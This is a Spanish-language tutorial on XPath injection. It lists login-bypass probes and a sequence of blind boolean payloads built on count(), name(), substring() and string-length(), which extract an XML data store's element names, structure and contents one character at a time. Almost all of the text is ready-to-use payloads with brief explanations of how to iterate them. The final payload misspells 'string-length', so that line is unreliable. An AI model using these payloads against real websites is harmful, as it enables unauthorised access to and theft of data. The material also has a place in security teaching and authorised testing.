

Estas inyecciones a veces se confunden con las inyecciones sql por lo que para ver si una web es vulnerable a xpath lo que se tiene que hacer es lo siguiente 


```bash
' or '1'='1

" or "1"="1

' or ''='

" or ""="
```


Estos son ejemplos de inyecciones de XPath con esto puedes saber si es vulnerable 


```bash
' and count(/*)='numero
```

Con esto puedes saber cuantas etiquetas principales se tienen si al colocar un numero este te responde entonces es que tiene esa cantidad de etiquetas principales de lo contrario es que no las tiene debes ir probando con numeros


```bash
' and name(/*[numero_etiqueta_principal])='nombre_etiqueta
```

Con esto dependiendo del indice de la etiqueta que coloques y colocando el nombre que supones que es el de la etiquteta si te responde es que ese es el nombre y si no pues que no es su nombre


```bash
' and substring(name(/*[numero_etiqueta_principal]),1,1)='caracter
```

Esta inyeccion sirve para averiguar los nombres de las etiquetas principales las cuales la va averiguando de caracter por caracter 


```bash
' and string-length(name(/*[numero_etiqueta_principal]))='longitud
```

Lo que hace esta inyeccion que al momento de colocar un numero como longitud y si la pagina responde entonces esta sera la longitud de lo contrario tendrias que ir probando numero por numero hasta encontrar el que te de una respuesta


```bash
' and count(/*[numero_etiqueta_principal]/*)='numero
```

Con esto puedes saber cuantas subetiquetas hay en una etiqueta principal puedes ir probando de numero en numero y el numero que te responda sera el numero de subetiquetas que tiene la etiqueta principal



```bash
' and name(/*[numero_etiqueta_principal]/*[numero_subetiqueta])='nombre_subetiqueta
```

Con esta inyeccion puedes tratar de verificar el nombre de una subetiqueta indicadndo el numero de la etiqueta y el nombre si al colocar un nombre te responde entonces significa que ese es el nombre de lo contrario deberas intentar con otros nombres

```bash
' and substring(name(/*[numero_etiqueta_principal]/*[numero_subetiqueta]),1,1)='caracter
```

Con esto puedes avergurar el nombre de una subetiqueta probando de caracter en caracter si este te responde correctamente entonces es un caracter valido de lo contrario tendras que probar con demas caracteres 

```bash
' and string-length(name(/*[numero_etiqueta_principal]/*[numero_subetiqueta]))='longitud
```

Con esta inyeccion puedes saber cual es la longitud del nombre de una subetiqueta tienes que ir probando con diferentes longitudes hasta que te responda una eso significara que esa es la longitud de la subetiqueta


```bash
' and count(/*[numero_etiqueta_principal]/*[numero_subetiqueta]/*)='numero
```


Con esto puedes saber el numero de subetiquetas hay dentro de una subetiqueta colocando la el numero de subetiqueta donde quieres avergiguar la cantidad probando de cantidad en cantidad y el numero que te responda correctamente ese sera el numero de subetquietas de lo contrario deberas seguir intentando



```bash
' and name(/*[numero_etiqueta_principal]/*[numero_subetiqueta]/*[numero_subetiqueta])='nombre_subetiqueta
```

Esta inyeccion lo que hace es que que trata de averigual el nombre de una subetiqueta de una subetiqueta para esto debes que colocar el un numero de subetiqueta y colocar un el cual tiene que corresponder al nombre de esa subetiqueta si esto responde correctamente significa que es el nombre de esa subetiqueta de lo contrario tendras que intentar con otros nombres


```bash
' and substring(name(/*[numero_etiqueta_principal]/*[numero_subetiqueta]/*[numero_subetiqueta]),1,1)='caracter
```


Esta inyeccion lo que hace es que ve si el primer caracter de una subetiqueta hija es igual a un caracter deterfminada si esto es verdadero entonces respondera correctamente de lo contrario tendras que ir provando con todos los caracteres posibles 


```bash
' and substring(nombre_subetiqueta,1,1)='caracter 
```


Esta inyección XPath seleccionará elementos cuya subetiqueta  comience con el carácter especificado 'caracter'. Por ejemplo, si el nombre es 'ejemplo', esta expresión devolverá verdadero si el primer carácter es 'e'.



```bash
' and string-lenth(subetiqueta)='longitud 
```


Con esta inyeccion se puede saber la longitud de el contenido de una subetiqueta se puede hacer probando numero por numero y el que responda correctamente sera la longitud del contenido de la subetiqueta